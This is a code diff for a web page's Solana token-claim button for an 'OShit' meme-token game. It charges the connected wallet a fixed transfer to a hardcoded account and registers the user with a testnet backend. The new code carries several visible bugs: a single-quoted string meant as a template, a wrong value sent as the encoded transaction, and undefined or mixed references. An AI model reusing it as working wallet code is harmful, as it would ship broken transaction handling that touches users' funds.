@@ -1,4 +1,4 @@
-import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, ComputeBudgetProgram } from '@solana/web3.js';
 
 $(function () {
   $('.claim').click(async function () {
@@ -19,61 +19,59 @@ $(function () {
 
     // 构建和发送交易
     async function claimToken(publicKey) {
-        try {
-            const userPK = publicKey
-            const balance = await connection.getBalance(userPK)
-            // 判断是否为 0
-            if (balance === 0) {
-              setToast('you don\'t have any SOL', 'alert-error')
-            }
-            else {
-                const dexNativeAccountMPK = new solanaWeb3.PublicKey(dexAccount);
-                const computeBudgetPriceInst = solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
-                    microLamports: user?.walletType.toLocaleLowerCase() === 'phantom' ? 1000 : 100000
-                });
-                const computeBudgetLimitInst = solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({ units: 600000 });
-                const toDexInst = solanaWeb3.SystemProgram.transfer({ fromPubkey: userPK, toPubkey: dexNativeAccountMPK, lamports: 2250000 });
+      const connection = new Connection('https://api.devnet.solana.com'); // 使用Devnet进行测试
 
-                const instructions = [computeBudgetPriceInst, computeBudgetLimitInst];
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized')
-                const transaction = new solanaWeb3.Transaction({ feePayer: userPK, blockhash, lastValidBlockHeight })
-                const provider = getProvider('phantom')
-                const message = transaction.compileMessage()
-                const feeInLamports = await connection.getFeeForMessage(message);
-                let toDexVaue = feeInLamports.value * (dexFeeRate / 100)
-                if (toDexVaue > maxDexFee) toDexVaue = maxDexFee
-                const toDexInst2 = solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: userPK,
-                    toPubkey: dexNativeAccountMPK,
-                    lamports: toDexVaue
-                })
-                const transactionReal = new solanaWeb3.Transaction({ feePayer: userPK, blockhash, lastValidBlockHeight })
-                const signedTransaction = await provider.signTransaction(transactionReal);
-                const t = signedTransaction.serialize({ requireAllSignatures: false, verifySignatures: false }).toString('hex')
+      const balance = await connection.getBalance(publicKey);
+      if (balance === 0) {
+        alert('You don\'t have any SOL');
+        return;
+      }
 
-            }
-        }catch (error) {
-         setToast(getErrorMessage(error), 'alert-error')
-        }
-        loadingRef.current = false
+      const computeBudgetPriceInst = ComputeBudgetProgram.setComputeUnitPrice({
+        microLamports: window.solana.walletType.toLocaleLowerCase() === 'phantom' ? 1000 : 100000,
+      });
+      const computeBudgetLimitInst = ComputeBudgetProgram.setComputeUnitLimit({ units: 600000 });
+
+      const instructions = [computeBudgetPriceInst, computeBudgetLimitInst];
+      const dexNativeAccountMPK = new solanaWeb3.PublicKey(dexAccount)
+      const lamports = 2250000;
+
+      const toDexInst = SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: dexNativeAccountMPK,
+        lamports: lamports,
+      });
+
+      instructions.push(toDexInst);
+
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+      const transaction = new Transaction({ feePayer: publicKey, blockhash, lastValidBlockHeight });
+      transaction.add(...instructions);
+
+      try {
+        const signedTransaction = await window.solana.signTransaction(transaction);
+        console.log('Transaction signed:', signedTransaction);
+
+        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+        await connection.confirmTransaction(signature);
+        console.log('Transaction successful with signature:', signature);
+
+        return signature;
+      } catch (err) {
+        console.error('Error sending transaction:', err);
+      }
     }
 
     // 调用后端API
-    async function callBackendAPI(signature) {
-        const nonce = Date.now().toString();
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        let username = 'User_';
-        for (let i = 0; i < 8; i++) {
-            username += characters.charAt(Math.floor(Math.random() * characters.length));
-        }
-        const userName = username;
-        const tokenSymbol = "OShit";
-        const brand = "OShit";
-        const message = `I am registering for this game SHIT Match for token OShit with my address ${address} with nonce ${nonce}`;
+    async function callBackendAPI(signature, userName) {
+      const brand = 'OShit';
+      const tokenSymbol = 'OShit'; 
+      const encodedTx = Buffer.from(signature).toString('base64'); 
+      const nonce = Date.now().toString();
+      const message = 'I am registering for this game SHIT Match for token OShit with my address ${address} with nonce ${nonce}'; // 替换为实际的签名
 
       try {
         const signedMessage = await window.solana.signMessage(new TextEncoder().encode(message), 'utf8');
-
         const response = await fetch('https://testnet.oshit.io/meme/api/v1/sol/game/claimAndRegisterUser', {
           method: 'POST',
           headers: {
@@ -82,7 +80,7 @@ $(function () {
           body: JSON.stringify({
             brand: brand,
             tokenSymbol: tokenSymbol,
-            encodedTx: t,
+            encodedTx: encodedTx,
             userName: userName,
             nonce: nonce,
             sign: signedMessage,
@@ -99,9 +97,14 @@ $(function () {
     async function main() {
       const publicKey = await connectWallet();
       if (publicKey) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let username = 'User_';
+        for (let i = 0; i < 8; i++) {
+            username += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
         const signature = await claimToken(publicKey);
         if (signature) {
-          await callBackendAPI(signature);
+          await callBackendAPI(signature, username);
         }
       }
     }
